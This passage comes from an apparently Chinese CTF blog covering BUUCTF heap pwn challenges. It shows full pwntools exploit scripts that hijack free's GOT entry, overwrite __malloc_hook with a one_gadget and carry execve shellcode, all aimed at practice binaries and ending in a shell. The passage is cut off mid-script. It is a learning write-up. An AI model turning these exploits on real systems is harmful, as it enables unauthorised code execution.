class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn3.13",)</span></span><br><span class="line"><span class="comment">#libc = ELF("/lib/i386-linux-gnu/libc.so.6")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26600</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.13"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size, length, text)</span>:</span></span><br><span class="line">sla(<span class="string">"Action: "</span>, <span class="string">'0'</span>)</span><br><span class="line">sla(<span class="string">"description: "</span>, str(size))</span><br><span class="line">sla(<span class="string">"name: "</span>, <span class="string">'pz1o'</span>)</span><br><span class="line">sla(<span class="string">"length: "</span>, str(length))</span><br><span class="line">sla(<span class="string">"text: "</span>, text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Del</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"Action: "</span>, <span class="string">'1'</span>)</span><br><span class="line">sla(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dis</span><span class="params">(index)</span>:</span></span><br><span class="line">sla(<span class="string">"Action: "</span>, <span class="string">'2'</span>)</span><br><span class="line">sla(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Upd</span><span class="params">(index, length, text)</span>:</span></span><br><span class="line">sla(<span class="string">"Action: "</span>, <span class="string">'3'</span>)</span><br><span class="line">sla(<span class="string">"index: "</span>, str(index))</span><br><span class="line">sla(<span class="string">"length: "</span>, str(length))</span><br><span class="line">sla(<span class="string">"text: "</span>, text)</span><br><span class="line">Add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">'AAAA'</span>)<span class="comment">#0</span></span><br><span class="line">Add(<span class="number">0x80</span>, <span class="number">0x80</span>, <span class="string">'BBBB'</span>)<span class="comment">#1</span></span><br><span class="line">Add(<span class="number">0x8</span>,<span class="number">0x8</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#2</span></span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line">free_got = elf.got[<span class="string">"free"</span>]</span><br><span class="line">Add(<span class="number">0x100</span>, <span class="number">0x19c</span>, <span class="string">"A"</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">'free'</span>]))</span><br><span class="line">Dis(<span class="number">1</span>)</span><br><span class="line">ru(<span class="string">"description: "</span>)</span><br><span class="line">free = uu32(r(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">'free'</span>,free)</span><br><span class="line">libc_base = free - libc.dump(<span class="string">'free'</span>)</span><br><span class="line">leak(<span class="string">"libc"</span>,libc_base)</span><br><span class="line">sys = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">sh = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>) </span><br><span class="line"><span class="comment"># libc_base = free - libc.sym["free"]</span></span><br><span class="line"><span class="comment"># leak("libc",libc_base)</span></span><br><span class="line"><span class="comment"># sys = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment"># sh = libc_base + next(libc.search("/bin/sh"))</span></span><br><span class="line">Upd(<span class="number">1</span>,<span class="number">0x4</span>,p32(sys))</span><br><span class="line">leak(<span class="string">"sys"</span>,sys)</span><br><span class="line">Del(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ZJCTF-2019-EasyHeap"><a href="#ZJCTF-2019-EasyHeap" class="headerlink" title="[ZJCTF 2019]EasyHeap"></a>[ZJCTF 2019]EasyHeap</h2><p>三个功能的堆</p><ol><li>增</li><li>删</li><li>改</li></ol><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193458599.png" alt="image-20210305193458599"></p><blockquote><p>add</p></blockquote><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193516175.png" alt="image-20210305193516175"></p><blockquote><p>del</p></blockquote><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210305193536046.png" alt="image-20210305193536046"></p><blockquote><p>edit</p></blockquote><h3 id="漏洞点：-2"><a href="#漏洞点：-2" class="headerlink" title="漏洞点："></a>漏洞点：</h3><ol><li>edit中size无限字节溢出</li></ol><h3 id="思路：-3"><a href="#思路：-3" class="headerlink" title="思路："></a>思路：</h3><ol><li>有system我们可以不泄露libc，直接利用unsorted bin attack将magic数值改大即可，但这种方法在buu上不适用</li><li>我们说更普遍的方法，有heaparrary，got表可写，我们想到的就是劫持got表</li><li>第一步，先分配3个堆块，第一个等会来写got表，第二个写/bin/sh，第三个是用来劫持fd指针。首先释放第三个，然后改fd指针，将伪造chunk到heaparray附近。</li><li>第二步，申请两个堆块，其中伪造chunk已经在heaparray附近，我们更改其heaparray[0]为free.got</li><li>第三步，修改第1个堆块的内容为sysytem</li><li>第四步，释放第2个堆块</li></ol><h3 id="技巧：-3"><a href="#技巧：-3" class="headerlink" title="技巧："></a>技巧：</h3><ol><li>修改堆管理指针为free.got</li><li>劫持free.got表</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./pwn3.14")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25957</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.14"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size,content)</span>:</span></span><br><span class="line">ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">sl(str(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">sl(str(size))</span><br><span class="line">ru(<span class="string">"Content of heap:"</span>)</span><br><span class="line">sl(content)</span><br><span class="line">ru(<span class="string">"SuccessFul"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">sl(str(<span class="number">3</span>))</span><br><span class="line">ru(<span class="string">"Index :"</span>)</span><br><span class="line">sl(str(index))</span><br><span class="line">ru(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">sl(str(<span class="number">2</span>))</span><br><span class="line">ru(<span class="string">"Index :"</span>)</span><br><span class="line">sl(str(index))</span><br><span class="line">ru(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">sl(str(size))</span><br><span class="line">ru(<span class="string">"Content of heap : "</span>)</span><br><span class="line">sl(content)</span><br><span class="line">ru(<span class="string">"Done !"</span>)</span><br><span class="line">free_got = elf.got[<span class="string">"free"</span>]</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"A"</span>*<span class="number">0x68</span>)<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"B"</span>*<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">"C"</span>*<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'a'</span> * <span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020b0</span><span class="number">-3</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(payload),payload)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'AAAA'</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">'DDDD'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">4</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="hitcontraining-uaf"><a href="#hitcontraining-uaf" class="headerlink" title="hitcontraining_uaf"></a>hitcontraining_uaf</h2><p>题重复了，uaf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">29579</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn3.15"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">sl(str(<span class="number">1</span>))</span><br><span class="line">ru(<span class="string">":"</span>)</span><br><span class="line">sl(str(size))</span><br><span class="line">ru(<span class="string">":"</span>)</span><br><span class="line">sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">sl(str(<span class="number">2</span>))</span><br><span class="line">ru(<span class="string">"Index :"</span>)</span><br><span class="line">sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prt</span><span class="params">(index)</span>:</span></span><br><span class="line">ru(<span class="string">"Your choice :"</span>)</span><br><span class="line">sl(str(<span class="number">3</span>))</span><br><span class="line">ru(<span class="string">"Index :"</span>)</span><br><span class="line">sl(str(index))</span><br><span class="line">magic = elf.sym[<span class="string">"magic"</span>]</span><br><span class="line"><span class="comment">#p = process("./pwn3.15")</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b'A'</span>*<span class="number">0x8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b'B'</span>*<span class="number">0x8</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x8</span>,p32(magic))</span><br><span class="line">prt(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>四个功能的堆</p><ol><li>add<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221232736.png" alt="image-20210307221232736"></li><li>edit<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221248396.png" alt="image-20210307221248396"></li><li>del<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221303827.png" alt="image-20210307221303827"></li><li>print<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221324705.png" alt="image-20210307221324705"></li></ol><h3 id="漏洞点：-3"><a href="#漏洞点：-3" class="headerlink" title="漏洞点："></a>漏洞点：</h3><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210307221400661.png" alt="image-20210307221400661"></p><p>这里有off by one漏洞</p><h3 id="思路：-4"><a href="#思路：-4" class="headerlink" title="思路："></a>思路：</h3><ol><li>和vn的那道题差不多，思路就是利用unsorted bin来获取基地址。</li><li>伪造chunk到malloc附近，利用realloc_hook加malloc_hook来getshell</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",29310)</span></span><br><span class="line">p = process(<span class="string">"./pwn3.23"</span>,env =&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc-2.232.so"</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.232.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'size:'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,size,data)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">'size:'</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'content:'</span>)</span><br><span class="line">    s(data)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">'choice: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'index:'</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#0</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x28</span> + <span class="string">'\xE1'</span></span><br><span class="line">edit(<span class="number">0</span>,(<span class="number">0x28</span>+<span class="number">10</span>),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">'content: '</span>)</span><br><span class="line">libc_base=uu64(r(<span class="number">6</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">leak(<span class="string">"malloc_hook"</span>,malloc_hook)</span><br><span class="line">realloc = libc_base + <span class="number">0x846C0</span>    <span class="comment">#本地与远程区别主要在这里</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526A</span></span><br><span class="line">leak(<span class="string">"realloc"</span>,realloc)</span><br><span class="line">add(<span class="number">0x60</span>) <span class="comment">#5 -&gt;2</span></span><br><span class="line">delete(<span class="number">2</span>) </span><br><span class="line">payload = p64(malloc_hook<span class="number">-0x23</span>)</span><br><span class="line">edit(<span class="number">5</span>,len(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>)<span class="comment">#6</span></span><br><span class="line">pld = <span class="string">'\x00'</span>*(<span class="number">0x13</span><span class="number">-0x8</span>) + p64(one_gadget)+p64(realloc)</span><br><span class="line">edit(<span class="number">6</span>,len(pld),pld)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>三个功能的堆</p><ol><li>add<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163719199.png" alt="image-20210308163719199"></li><li>del<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163737207.png" alt="image-20210308163737207"></li><li>print<img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163753460.png" alt="image-20210308163753460"></li></ol><p>堆管理结构</p><p><img src="/2021/02/15/BUU-PWN3-%E5%A0%86/image-20210308163854025.png" alt="image-20210308163854025"></p><h3 id="漏洞点：-4"><a href="#漏洞点：-4" class="headerlink" title="漏洞点："></a>漏洞点：</h3><ol><li>UAF</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 